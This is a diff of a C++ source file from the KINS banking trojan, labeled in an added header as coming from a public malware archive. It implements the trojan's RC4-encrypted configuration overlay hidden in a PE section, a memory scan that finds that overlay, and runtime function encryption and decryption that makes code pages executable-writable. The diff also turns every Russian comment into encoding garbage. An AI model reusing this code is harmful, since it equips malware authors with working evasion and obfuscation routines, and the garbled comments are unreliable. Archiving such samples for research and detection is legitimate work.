@@ -1,15 +1,26 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "baseoverlay.h"
 #include "crypt.h"
 
-//Обший заголовк для оверлея.
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 # pragma pack(push, 1)
 typedef struct
 {
-  DWORD magicDword;  //Магический заголовок MAGIC_DWORD. Должен быть первый в стуктуре.
-  DWORD crc32;       //CRC32 для (FULL_SIZE_OF_OVERLAY - &dataSize).
-  WORD dataSize;     //Размер данных.
+  DWORD magicDword;  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ MAGIC_DWORD. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  DWORD crc32;       //CRC32 пїЅпїЅпїЅ (FULL_SIZE_OF_OVERLAY - &dataSize).
+  WORD dataSize;     //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 }HEADER;
 # pragma pack(pop)
 
@@ -27,11 +38,11 @@ bool BaseOverlay::_loadOverlay(void *buffer, const void *overlay, LPDWORD overla
 {  
   if(*overlaySize < FULL_SIZE_OF_OVERLAY)return false;
   
-  //Создаем копию.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   Mem::_copy(buffer, overlay, FULL_SIZE_OF_OVERLAY);
   HEADER *header = (HEADER *)buffer;
     
-  //Расшифровывем.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(rc4Key != NULL)
   {
     Crypt::RC4KEY rc4k;
@@ -39,14 +50,14 @@ bool BaseOverlay::_loadOverlay(void *buffer, const void *overlay, LPDWORD overla
     Crypt::_rc4(buffer, FULL_SIZE_OF_OVERLAY, &rc4k);
   }
   
-  //Проверяем хэш.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
   if(header->magicDword != MAGIC_DWORD || Crypt::crc32Hash((LPBYTE)buffer + OFFSETOF(HEADER, dataSize), FULL_SIZE_OF_OVERLAY - OFFSETOF(HEADER, dataSize)) != header->crc32 ||
      header->dataSize > FULL_SIZE_OF_OVERLAY - sizeof(HEADER))
   {
     return false;
   }
   
-  //Все окей.
+  //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   *overlaySize = header->dataSize;
   Mem::_copy(buffer, (LPBYTE)buffer + sizeof(HEADER), header->dataSize);
   return true;
@@ -59,16 +70,16 @@ bool BaseOverlay::_createOverlay(void *overlay, const void *data, WORD dataSize,
   HEADER *header = (HEADER *)overlay;
   LPBYTE p       = (LPBYTE)overlay + sizeof(HEADER);
   
-  //Заполняем оверлей.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   Mem::_copy(p, data, dataSize);
   Crypt::_generateBinaryData(p + dataSize, FULL_SIZE_OF_OVERLAY - sizeof(HEADER) - dataSize, 0x00, 0xFF, false);   
     
-  //Получаем хэш.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
   header->magicDword = MAGIC_DWORD;
   header->dataSize   = dataSize;
   header->crc32      = Crypt::crc32Hash((LPBYTE)overlay + OFFSETOF(HEADER, dataSize), FULL_SIZE_OF_OVERLAY - OFFSETOF(HEADER, dataSize));
 
-  //Шифруем.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(rc4Key != NULL)
   {
     Crypt::RC4KEY rc4k;
@@ -83,7 +94,7 @@ void *BaseOverlay::_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY 
 {
 #if(BO_CRYPT > 0)
   IMAGE_SECTION_HEADER *section = PeImage::_getSectionByName(mem, ".data");
-  size = 512; //Договор с криптором.
+  size = 512; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(section->SizeOfRawData <= size)return NULL;
   return (void *)((LPBYTE)mem + section->PointerToRawData);
 #else  
@@ -94,22 +105,22 @@ void *BaseOverlay::_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY 
   Crypt::RC4KEY rc4k;
   BYTE buffer[FULL_SIZE_OF_OVERLAY];
 
-  //Поиск.
+  //пїЅпїЅпїЅпїЅпїЅ.
   for(; p <= end; p++)
   {
     DWORD magicDword = *(LPDWORD)p;
     
-    //Снимем шифрование.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(rc4Key != NULL)
     {
       Mem::_copy(&rc4k, rc4Key, sizeof(Crypt::RC4KEY));
       Crypt::_rc4(&magicDword, sizeof(DWORD), &rc4k);
     }
 
-    //Кажется найден заголовок.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(magicDword == MAGIC_DWORD)
     {
-      //Ну и для 100% гарантии.
+      //пїЅпїЅ пїЅ пїЅпїЅпїЅ 100% пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       DWORD overlaySize = FULL_SIZE_OF_OVERLAY;
       if(BaseOverlay::_loadOverlay(buffer, p, &overlaySize, rc4Key))return (void *)p;
     }
@@ -125,7 +136,7 @@ DWORD BaseOverlay::_encryptFunction(LPBYTE curOpcode, DWORD key)
   DWORD opcodeSize;
   DWORD size = 0;
 
-  while((opcodeSize = Disasm::_getOpcodeLength(curOpcode)) != (DWORD)(-1) && *curOpcode != 0xC3 && *curOpcode != 0xC2 && *curOpcode != 0xCB && *curOpcode != 0xCA)//Все виды ret для x32, x64
+  while((opcodeSize = Disasm::_getOpcodeLength(curOpcode)) != (DWORD)(-1) && *curOpcode != 0xC3 && *curOpcode != 0xC2 && *curOpcode != 0xCB && *curOpcode != 0xCA)//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ ret пїЅпїЅпїЅ x32, x64
   {
     for(DWORD i = 0; i < opcodeSize; i++)
     {
@@ -139,7 +150,7 @@ DWORD BaseOverlay::_encryptFunction(LPBYTE curOpcode, DWORD key)
   return size;
 }
 
-void __declspec(noinline)/*Для BuildBot::_run()*/ BaseOverlay::_decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key)
+void __declspec(noinline)/*пїЅпїЅпїЅ BuildBot::_run()*/ BaseOverlay::_decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key)
 {
   DWORD oldProtect;
   if(CWA(kernel32, VirtualProtect)(curOpcode, size, PAGE_EXECUTE_READWRITE, &oldProtect) != FALSE)
